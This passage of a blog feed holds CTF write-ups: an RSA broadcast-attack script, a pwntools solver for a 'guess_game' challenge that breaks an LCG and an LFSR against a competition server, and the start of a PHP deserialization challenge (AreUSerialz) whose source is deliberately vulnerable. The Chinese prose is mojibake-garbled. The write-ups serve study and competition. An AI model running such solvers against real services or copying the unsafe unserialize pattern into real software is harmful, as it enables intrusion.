class="line">n2 = <span class="number">21996468204721630460566169654781925102402634427772676287751800587544894952838038401189546149401344752771866376882226876072201426041697882026653772987648569053238451992877808811034545463363146057879646485465730317977739706776287970278094261290398668538232727000322458605289913900919015380904209692398479885177984131014170652915222062267448446642158394150657058846328033404309210836219241651882903083719822769947131283541299760283547938795574020478852839044803553093825730447126796668238131579735916546235889726257184058908852902241422169929720898025622336508382492878690496154797198800699611812166851455110635853297883</span></span><br><span class="line">c3 = <span class="number">5170826942130658374627267470548549396328896108666717036999395626588154882531377393671593939192779292151584678688653835775920356845071292462816417186595460417761844407911946323815187102170021222644920874070699813549492713967666736815947822200867353461264579419205756500926218294604616696969184793377381622818381733352202456524002876336304465082656612634304327627259494264840838687207529676882041997761204004549052900816658341867989593333356630311753611684503882509990853456022056473296726728969894815574884063807804354952314391764618179147583447848871220103094864884798102542377747761263052887894135796051521881179607</span></span><br><span class="line">n3 = <span class="number">22182114562385985868993176463839749402849876738564142471647983947408274900941377521795379832791801082248237432130658027011388009638587979450937703029168222842849801985646044116463703409531938580410511097238939431284352109949200312466658018635489121157805030775386698514705824737070792739967925773549468095396944503293347398507980924747059180705269064441084577177316227162712249300900490014519213102070911105044792363935553422311683947941027846793608299170467483012199132849683112640658915359398437290872795783350944147546342693285520002760411554647284259473777888584007026980376463757296179071968120796742375210877789</span></span><br><span class="line"></span><br><span class="line">m =  GCRT([n1,n2,n3],[c1,c2,c3])[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">65538</span>):</span><br><span class="line">    flag = long_to_bytes(gmpy2.iroot(m,e)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span> flag</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><h3 id="guess-game"><a href="#guess-game" class="headerlink" title="guess_game"></a>guess_game</h3><p>éœ€è¦è§£å‡ºå‰é¢çš„æ–¹ç¨‹ï¼Œå¾—åˆ°ç¬¬7ä¸ªdï¼Œæ‰å¯ä»¥æœ‰å¾—åˆ°åé¢10ä¸ªè¾“å‡ºçš„æœºä¼šã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = getPrime(<span class="number">64</span>)</span><br><span class="line">b = getPrime(<span class="number">64</span>)</span><br><span class="line">c = getPrime(<span class="number">64</span>)</span><br><span class="line">d = <span class="built_in">int</span>(urandom(<span class="number">8</span>).encode(<span class="string">&#x27;hex&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">code = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    d = (d * a + c) % b</span><br><span class="line">    code.append(d)</span><br></pre></td></tr></table></figure><p>ç»™äº†å‰å…­ä¸ªdï¼Œéœ€è¦æ±‚å‡ºç¬¬ä¸ƒä¸ªdã€‚è§£æ–¹ç¨‹æ¯”è¾ƒéº»çƒ¦åœ¨äºbæ˜¯æ¨¡æ•°å¹¶ä¸”æœªçŸ¥ã€‚</p><p>å‚è€ƒ<a href="https://math.stackexchange.com/questions/1861606/solving-linear-congruences-with-unknown-modulusã€‚">https://math.stackexchange.com/questions/1861606/solving-linear-congruences-with-unknown-modulusã€‚</a></p><p>æˆ‘ä»¬ç›®å‰æ‹¥æœ‰5ä¸ªæ–¹ç¨‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x1*a + c &#x3D; x2 mod b</span><br><span class="line">x2*a + c &#x3D; x3 mod b</span><br><span class="line">x3*a + c &#x3D; x4 mod b</span><br><span class="line">x4*a + c &#x3D; x5 mod b</span><br><span class="line">x5*a + c &#x3D; x6 mod b</span><br></pre></td></tr></table></figure><p>å¤§è‡´æ€è·¯å°±æ˜¯é€šè¿‡ç­‰å¼ç›¸å‡ï¼Œå¾—åˆ°ä¸€äº› x*a=y mod bçš„æ–¹ç¨‹ï¼Œç„¶åæŒ‘ä¸¤ä¸ªäº’ç´ çš„xä½œä¸ºåŸºåº•ï¼Œé€šè¿‡è¿™ä¸¤ä¸ªå¼å­æ„é€ å‡º a=m mod bï¼Œå†ä»»æ„æŒ‘é€‰ä¸€ x0*a=y0 mod bï¼Œå¾—åˆ°:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m*x0&#x3D;y0 mod b</span><br></pre></td></tr></table></figure><p>å¾—åˆ° b|(m*x2-y2)ï¼Œå†åˆ†è§£bï¼Œæ‰¾å‡ºå…¶ä¸­çš„64bitçš„ç´ æ•°ï¼Œå°±è¿˜åŸäº†bã€‚è¿˜åŸbåaå’Œcå°±å¥½ç®—äº†ã€‚</p><p>ç„¶åæœ‰åæ¬¡æœºä¼šçŒœæ•°ï¼Œgameå…¶å®æ˜¯ä¸ª39bitçš„lfsrï¼Œåˆæ€ä¸keyæœªçŸ¥ï¼Œéœ€è¦78bitè¿˜åŸï¼Œæ­£å¸¸æƒ…å†µä¸‹å¾—åˆ°78bitéœ€è¦åä¸ªæ•°ï¼Œä½†æ˜¯åä¸ªæ•°é”™è¯¯åç›´æ¥é€€å‡ºäº†ï¼Œæ‰€ä»¥éœ€è¦çŒœåæ¬¡çš„è¿‡ç¨‹ä¸­ï¼ŒçŒœå¯¹ä¸€ä¸ªã€‚ï¼ˆå†™ä¸ªå¾ªç¯çˆ†ç ´ï¼‰</p><p>æ¦‚ç‡æ˜¯ <code>1-(255/256)^10</code>ï¼Œå¤§çº¦æ˜¯ 3%ã€‚</p><p>çŒœå¯¹åï¼Œå¯ä»¥æ ¹æ®78bitè¿˜åŸåˆæ€ä¸keyï¼Œå’Œå»å¹´de1ctfçš„æ€è·¯ä¸€æ ·ï¼Œè§£æ–¹ç¨‹ç»„å°±å¥½äº†ï¼Œé«˜æ–¯æ¶ˆå…ƒæ³•ï¼Œå¯ä»¥å‚è€ƒ<a href="http://igml.top/2019/08/04/2019-de1ctf/#babylfsr">http://igml.top/2019/08/04/2019-de1ctf/#babylfsr</a></p><p>è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Game</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, n, key, r, b</span>):</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.key = key</span><br><span class="line">        self.r = r &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.b = b</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">out</span>(<span class="params">self</span>):</span></span><br><span class="line">        o = self.r &amp; <span class="number">1</span></span><br><span class="line">        p = self.r &amp; self.key</span><br><span class="line">        q = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> p:</span><br><span class="line">            q = q + p &amp; <span class="number">1</span></span><br><span class="line">            p = p &gt;&gt; <span class="number">1</span></span><br><span class="line">        q = q &amp; <span class="number">1</span></span><br><span class="line">        t = q &lt;&lt; (self.n - <span class="number">2</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        self.r = t | (self.r &gt;&gt; <span class="number">1</span>) &amp; (<span class="number">2</span> ** self.n - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> o</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">next</span>(<span class="params">self</span>):</span></span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(self.b):</span><br><span class="line">            o = self.out()</span><br><span class="line">            res |= o &lt;&lt; (self.b - <span class="number">1</span> - i)</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y = egcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> y, x - a / b * y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_mask</span>(<span class="params">stream</span>):</span></span><br><span class="line">    dim = <span class="number">39</span></span><br><span class="line">    left, right = stream[:<span class="number">39</span>], stream[<span class="number">39</span>:]</span><br><span class="line">    magic = [<span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(right[:i][::<span class="number">-1</span>] + left[:(<span class="number">39</span> - i)])) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">39</span>)]</span><br><span class="line">    cipher = <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">list</span>(right))</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">len</span>(cipher)</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(cipher) == <span class="number">39</span></span><br><span class="line">    <span class="comment"># é«˜æ–¯æ¶ˆå…ƒ</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(j, dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span>:</span><br><span class="line">                magic[i], magic[j] = magic[j], magic[i]</span><br><span class="line">                cipher[i], cipher[j] = cipher[j], cipher[i]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">            <span class="keyword">if</span> magic[i][j] == <span class="number">1</span> <span class="keyword">and</span> i != j:</span><br><span class="line">                <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(dim):</span><br><span class="line">                    magic[i][k] ^= magic[j][k]</span><br><span class="line">                cipher[i] ^= cipher[j]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, cipher)), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r = remote(<span class="string">&#x27;59.110.243.101&#x27;</span>, <span class="number">5123</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    n = []</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Baby:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Easy:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Normal:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Hard:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Master:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;Crazy:&quot;</span>)</span><br><span class="line">    tmp = r.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    n.append(<span class="built_in">int</span>(tmp))</span><br><span class="line">    n1, n2, n3, n4, n5, n6 = n</span><br><span class="line">    a = n2 - n1</span><br><span class="line">    b = n3 - n2</span><br><span class="line">    c = n4 - n3</span><br><span class="line">    <span class="keyword">if</span> gmpy2.gcd(a, b) != <span class="number">1</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    x, y = egcd(a, b)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">assert</span> x * a + y * b == <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        r.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    d = b * x + c * y</span><br><span class="line">    m_bei = <span class="built_in">abs</span>(d * (n5 - n4) - (n6 - n5))</span><br><span class="line">    data = os.popen(<span class="string">&#x27;sage test.sage %s&#x27;</span> % <span class="built_in">str</span>(m_bei)).read()  <span class="comment"># åˆ†è§£</span></span><br><span class="line">    data = data.split(<span class="string">&quot; * &quot;</span>)</span><br><span class="line">    m = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">int</span>(i).bit_length() == <span class="number">64</span>:</span><br><span class="line">                m = <span class="built_in">int</span>(i)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    info(m)</span><br><span class="line">    aa = (gmpy2.invert(a, m) * b) % m</span><br><span class="line">    cc = (n2 - n1 * aa) % m</span><br><span class="line">    res = (aa * n6 + cc) % m</span><br><span class="line">    success(res)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(res))</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Your choice:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    answer = []</span><br><span class="line">    flag = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        r.sendlineafter(<span class="string">&quot;Input your answer:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Right&quot;</span> <span class="keyword">in</span> r.recvuntil(<span class="string">&quot;!&quot;</span>):</span><br><span class="line">            flag = <span class="literal">True</span></span><br><span class="line">        r.recvuntil(<span class="string">&quot;The answer is&quot;</span>)</span><br><span class="line">        answer.append(<span class="built_in">int</span>(r.recvuntil(<span class="string">&quot;!&quot;</span>).strip(<span class="string">&quot;!&quot;</span>)))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flag:</span><br><span class="line">        info(<span class="string">&#x27;times:&#x27;</span> + <span class="built_in">str</span>(time))</span><br><span class="line">        time += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    info(<span class="string">&#x27;success!&#x27;</span>)</span><br><span class="line">    init = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> answer[:<span class="number">5</span>]:</span><br><span class="line">        init += <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    init = init[::<span class="number">-1</span>]</span><br><span class="line">    first = init[<span class="number">0</span>]</span><br><span class="line">    init = init[<span class="number">1</span>:]</span><br><span class="line">    rr = <span class="built_in">int</span>(init, <span class="number">2</span>)</span><br><span class="line">    res = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> answer[<span class="number">5</span>:]:</span><br><span class="line">        res += <span class="built_in">bin</span>(i)[<span class="number">2</span>:].zfill(<span class="number">8</span>)</span><br><span class="line">    res = (first + res)[:<span class="number">-2</span>]</span><br><span class="line">    key = get_mask(init + res)</span><br><span class="line">    game = Game(<span class="number">40</span>, key, rr, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">assert</span> [game.<span class="built_in">next</span>() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)] == answer</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;Input your answer:&quot;</span>, <span class="built_in">str</span>(game.<span class="built_in">next</span>()))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·‘äº†å¾ˆå¤šæ¬¡ï¼Œç»“æœï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-c2056d3de83b64d7.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Web </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020ç½‘é¼æ¯-é’é¾™ç»„wp</title>
      <link href="/2020/05/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99/"/>
      <url>/2020/05/13/2020-%E7%BD%91%E9%BC%8E%E6%9D%AF-%E9%9D%92%E9%BE%99/</url>
      
        <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h3><a id="more"></a><p>é¢˜ç›®æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $op;</span><br><span class="line">    <span class="keyword">protected</span> $filename;</span><br><span class="line">    <span class="keyword">protected</span> $content;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        $filename = <span class="string">&quot;/tmp/tmpfile&quot;</span>;</span><br><span class="line">        $content = <span class="string">&quot;Hello World!&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">process</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;1&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;write();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op == <span class="string">&quot;2&quot;</span>) &#123;</span><br><span class="line">            $res = <span class="keyword">$this</span>-&gt;read();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output($res);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Bad Hacker!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;content)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen((<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;content) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Too long!&quot;</span>);</span><br><span class="line">                <span class="keyword">die</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            $res = file_put_contents(<span class="keyword">$this</span>-&gt;filename, <span class="keyword">$this</span>-&gt;content);</span><br><span class="line">            <span class="keyword">if</span>($res) <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Successful!&quot;</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;output(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $res = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;filename)) &#123;</span><br><span class="line">            $res = file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">output</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[Result]: &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> $s;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;op === <span class="string">&quot;2&quot;</span>)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;op = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;content = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;process();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_valid</span>(<span class="params">$s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($s); $i++)</span><br><span class="line">        <span class="keyword">if</span>(!(ord($s[$i]) &gt;= <span class="number">32</span> &amp;&amp; ord($s[$i]) &lt;= <span class="number">125</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET&#123;<span class="string">&#x27;str&#x27;</span>&#125;)) &#123;</span><br><span class="line"></span><br><span class="line">    $str = (<span class="keyword">string</span>)$_GET[<span class="string">&#x27;str&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_valid($str)) &#123;</span><br><span class="line">        $obj = unserialize($str);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é€‰æ‹©è¯»æ–‡ä»¶ï¼Œop 